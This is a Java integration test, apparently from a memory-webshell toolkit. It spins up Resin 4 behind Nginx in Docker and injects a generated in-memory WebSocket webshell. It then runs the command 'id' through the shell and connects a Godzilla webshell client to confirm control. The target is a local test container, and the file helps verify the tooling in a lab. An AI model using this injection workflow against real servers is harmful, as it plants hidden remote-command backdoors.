package com.reajason.javaweb.integration.memshell.resin;

import com.reajason.javaweb.godzilla.BlockingJavaWebSocketClient;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.integration.ShellAssertion;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ServerType;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.utils.tuple.Pair;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.parallel.ResourceLock;
import org.testcontainers.containers.ComposeContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;

import java.io.File;
import java.io.IOException;

import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Resin 4 的 RawWebSocket helper 在连接器层接管连接；Nginx 通过 Upgrade/Connection
 * 透传完成 101 之后的字节流隧道。
 *
 * @author ReaJason
 */
// compose 文件写死宿主端口，同锁互斥避免并发启动端口冲突
@ResourceLock("fixed-port-compose")
@Testcontainers
@Slf4j
public class Resin4067WebSocketNginxTest {

    public static final String imageName = "reajason/resin:4.0.67-jdk11";

    @Container
    public static final ComposeContainer compose =
            new ComposeContainer(new File("docker-compose/resin/docker-compose-4.0.67-jdk11-nginx.yaml"))
                    .withExposedService("resin", 8080, Wait.forHttp("/app/"))
                    .withExposedService("nginx", 80);

    public static String getUrl() {
        String host = compose.getServiceHost("nginx", 80);
        int port = compose.getServicePort("nginx", 80);
        String url = "http://" + host + ":" + port + "/app";
        log.info("container started, app url is : {}", url);
        return url;
    }

    @Test
    public void testWs() {
        String url = getUrl();
        String server = ServerType.RESIN;
        int targetJdkVersion = Opcodes.V11;
        String shellType = ShellType.RAW_WEBSOCKET;
        String shellTool = ShellTool.Command;
        String packer = Packers.DefaultBase64;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();
        ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
        MemShellResult generateResult = ShellAssertion.generate(urlPattern, server, "Unknown", shellType,
                shellTool, targetJdkVersion, shellToolConfig, packer);
        ShellAssertion.packerResultAndInject(generateResult, url, shellTool, shellType, packer, null);
        String response = BlockingJavaWebSocketClient.sendRequestWaitResponse(shellUrl, "id");
        assertTrue(response.contains("uid="));
    }

    @Test
    public void testGodzillaWs() {
        String url = getUrl();
        String server = ServerType.RESIN;
        int targetJdkVersion = Opcodes.V11;
        String shellType = ShellType.RAW_WEBSOCKET;
        String shellTool = ShellTool.Godzilla;
        String packer = Packers.DefaultBase64;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();
        ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
        MemShellResult generateResult = ShellAssertion.generate(urlPattern, server, "Unknown", shellType,
                shellTool, targetJdkVersion, shellToolConfig, packer);
        ShellAssertion.packerResultAndInject(generateResult, url, shellTool, shellType, packer, null);
        GodzillaConfig godzillaConfig = (GodzillaConfig) generateResult.getShellToolConfig();
        try (GodzillaManager godzillaManager = GodzillaManager.builder()
                .entrypoint(shellUrl).pass(godzillaConfig.getPass())
                .key(godzillaConfig.getKey()).build()) {
            assertTrue(godzillaManager.start());
            assertTrue(godzillaManager.test());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
